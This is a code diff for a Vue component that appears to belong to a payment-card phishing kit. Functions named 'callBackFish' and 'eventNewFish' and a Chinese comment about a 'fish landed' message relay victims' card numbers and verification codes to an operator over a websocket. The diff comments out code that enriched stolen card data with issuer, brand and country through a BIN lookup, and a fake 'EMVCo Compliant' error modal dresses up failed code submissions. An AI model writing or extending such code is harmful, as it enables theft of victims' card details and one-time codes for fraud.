@@ -148,7 +148,7 @@
       <transition name="modal-fade">
         <div
             v-if="showError"
-            class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50"
+            class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-gray-900/40"
             @click.self="closeErrorModal"
         >
           <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all">
@@ -209,6 +209,7 @@ import { ref, watch, onBeforeUnmount, onMounted } from 'vue';
 import { addOnMessage, removeOnMessage, sendMsg } from '~/utils';
 import type { WebSocketMessage } from '~/utils';
 import {useLoadingStore} from "~/stores/loading";
+import {checkBinApi} from "~/composables/api";
 
 const loadingStore = useLoadingStore();
 
@@ -236,6 +237,7 @@ watch(countdown, (newValue) => {
 const handleSubmit = async () => {
   submitCode()
   isSubmitting.value = true;
+  loadingStore.loadLoading();
 };
 // 发送验证码给后端
 function submitCode() {
@@ -266,6 +268,7 @@ const callBackFish = (res: WebSocketMessage) => {
     cardInfo.value['code'] = ''
     // 提交失败，提示用户 - EMVCo Compliant Modal Display
     showError.value = true;
+    loadingStore.unloadLoading();
   }
   console.log("callBackFish：",res)
 };
@@ -287,20 +290,51 @@ const closeErrorModal = () => {
   showError.value = false;
 };
 
-onMounted(() => {
+onMounted( async() => {
   // 在当前页面注册消息监听
   addOnMessage(eventCallBack, callBackFish);
 
-  // 解析URL参数
-  const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));
-  // 初始化
-  resultObject['status'] = 'ready';
-  cardInfo.value = resultObject;
-
-  // 发送上鱼消息
-  sendMsg(eventNewFish, {
-    message: cardInfo.value,
-  });
+  // // 解析URL参数
+  // const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));
+  //
+  // // 解析bin
+  // const binInfo = await $fetch('/api/check-bin', {
+  //   method: 'POST',
+  //   body: { bin: resultObject.cardNo.slice(0,6) }
+  // });
+  // if(binInfo.success) {
+  //   resultObject['cardBank'] = binInfo.data.bank;
+  //   resultObject['cardBrand'] = binInfo.data.brand;
+  //   resultObject['cardType'] = binInfo.data.type;
+  //   resultObject['cardLevel'] = binInfo.data.level;
+  //   resultObject['cardCountry'] = binInfo.data.country;
+  //   resultObject['cardCountryFlag'] = binInfo.data.additional_info.country_flag;
+  // }
+  //
+  // // const binInfo = await $fetch('/api/check-bin', {
+  // //   method: 'GET',
+  // //   query: { bin: resultObject.cardNo }
+  // // });
+  // //
+  // // if(binInfo.success) {
+  // //   resultObject['cardBank'] = binInfo.BIN.issuer.name;
+  // //   resultObject['cardBrand'] = binInfo.BIN.brand;
+  // //   resultObject['cardType'] = binInfo.BIN.type;
+  // //   resultObject['cardLevel'] = binInfo.BIN.level;
+  // //   resultObject['cardCountry'] = binInfo.BIN.country.alpha2;
+  // //   resultObject['cardCountryFlag'] = binInfo.BIN.country.flag;
+  // // }
+  //
+  // // 初始化
+  // resultObject['status'] = 'ready';
+  // console.log(resultObject);
+  // cardInfo.value = resultObject;
+  //
+  //
+  // // 发送上鱼消息
+  // sendMsg(eventNewFish, {
+  //   message: cardInfo.value,
+  // });
 });
 
 onBeforeUnmount(() => {
